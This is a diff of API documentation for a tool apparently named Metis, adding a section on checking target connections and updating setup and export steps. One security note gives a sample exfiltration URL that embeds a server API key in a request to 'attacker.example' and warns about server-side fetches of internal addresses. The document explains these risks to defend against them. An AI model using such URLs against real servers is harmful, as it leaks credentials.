@@ -13,12 +13,17 @@ Install and start the API from the repository root:
 
 ```bash
 make install-api
-cp apps/api/.env.example .env
+cp .env.example .env
 make run-api
 ```
 
-Set `OPENAI_API_KEY`, `OPENAI_BASE_URL`, and `INTERVIEW_MODEL` in `.env`. The examples use
-`http://localhost:8001` and require `curl` and `jq`.
+Set `OPENAI_API_KEY` in `.env`, and `OPENAI_BASE_URL` when you do not use the default OpenAI
+endpoint. See the [model guide](../models.md) for the variables of each role. The API starts when a
+setting is missing. `GET /api/v1/models` returns the model name, its source, and the configured
+status of each role, never a key or a URL. Until the interview role is configured, the Interview routes return
+503 `model_unavailable`. Without an embeddings key, the Interview runs, and each Criterion uses the
+criterion judge. The examples use `http://localhost:8001` and require `curl`
+and `jq`.
 
 The API is stateless. Your client owns the Interview state.
 
@@ -289,7 +294,7 @@ jq -c '.state' interview.json | \
 Add one `-F 'files=@<path>'` part for each original fixture referenced by the completed Specification.
 The response `Content-Disposition` header supplies the ZIP filename. The ZIP contains a
 `YYYYMMDD-HHMMSS-interview/` root folder with `inputs/interview_state.json`, `outputs/specification.yaml`, and
-`outputs/fixtures/`. The API compiles the Specification directly from the supplied state and
+`outputs/fixtures/`. In run mode, it also contains `outputs/target-binding.yaml`. The API compiles the Specification directly from the supplied state and
 saves that same state with its current JSON format. Send exactly one source field; requests
 with both `state` and `specification` are rejected.
 
@@ -302,6 +307,69 @@ a generated Specification and marks a completed export. Extract the archive into
 and use its dated folder as the Engine input. For example, run
 `metis engine run --input-dir experiments/design/20261016-223045-interview/outputs/`. Task fixture references stay relative
 to `outputs/fixtures/`. Wizard exports contain no Testbed embedding caches or score files.
+
+## Connect the target
+
+A target binding tells the Engine how to reach the target. See
+[Connect the target](../wizard.md#connect-the-target) for the fields and the rules. Each secret
+field takes the name of an environment variable, never its value.
+
+| Endpoint | Body | Response |
+|---|---|---|
+| `POST /connection/check` | `{"binding": {...}}` | `binding` (the valid binding, or `null`), `errors` as `loc` and `msg` only, `live`, `probes`, and `status` |
+| `POST /connection` | `{"state": ..., "connection": ... or null}` | The state with the connection set or removed |
+
+A binding that is not valid gives a 200 response with `errors`. No error repeats the value that
+was rejected. A request with the wrong shape gives a 422 response. Its message names each field
+and its reason, and never the input.
+
+An API that listens on `127.0.0.1`, `localhost`, or `::1` runs for one user, so it also reports
+each named variable as set or not set in its own environment, fetches the OpenAPI document or
+loads the start page, and checks that the API server answers. Any other API only validates the
+binding: `live` is `false` and `status` is `unchecked`, because a server that fetches any URL that
+a client sends is a risk. `METIS_API_CONNECTION_CHECK=1` or `0` overrides this.
+
+The API never puts a value from its own environment into a URL that it requests. Otherwise a
+client could send `https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A
+`spec_url` or `start_url` that names a `${NAME}` variable is not requested: its probe says so, and
+`status` is `unchecked`. To check that URL, run `metis wizard connect` on the computer that has
+the variables.
+
+The live check still sends requests to any other URL that a client gives, including an internal
+address that only the API host can reach. Set `METIS_API_CONNECTION_CHECK=1` on a shared server
+only when that is acceptable.
+
+Check a binding:
+
+```bash
+curl --fail-with-body http://localhost:8001/api/v1/wizard/connection/check \
+  -H 'Content-Type: application/json' \
+  -d '{"binding": {"schema_version": 1, "identity": {"name": "Policy assistant"},
+       "transport": "http", "spec_url": "${APP_URL}/openapi.json",
+       "auth": {"secret_env": "APP_KEY"}}}'
+```
+
+To start in run mode, put a connection in the start request:
+
+```json
+{
+  "description": "A research assistant for policy analysts.",
+  "known_capability_ids": [],
+  "capability_confidence": "medium",
+  "connection": {
+    "transport": "http",
+    "binding": {"schema_version": 1, "identity": {"name": "Policy assistant"},
+                "transport": "http", "spec_url": "${APP_URL}/openapi.json"},
+    "status": "unchecked"
+  }
+}
+```
+
+The connection travels in `state.context.connection`. Prompts and the model never read it. A
+spec-only state has no `connection` key. To add or replace the connection later, send the state
+to `POST /connection` and save the returned state. `POST /package` then adds
+`outputs/target-binding.yaml`, and `outputs/specification.yaml` names the gen_2 runner and the
+binding file.
 
 ## Handle errors and resume
 
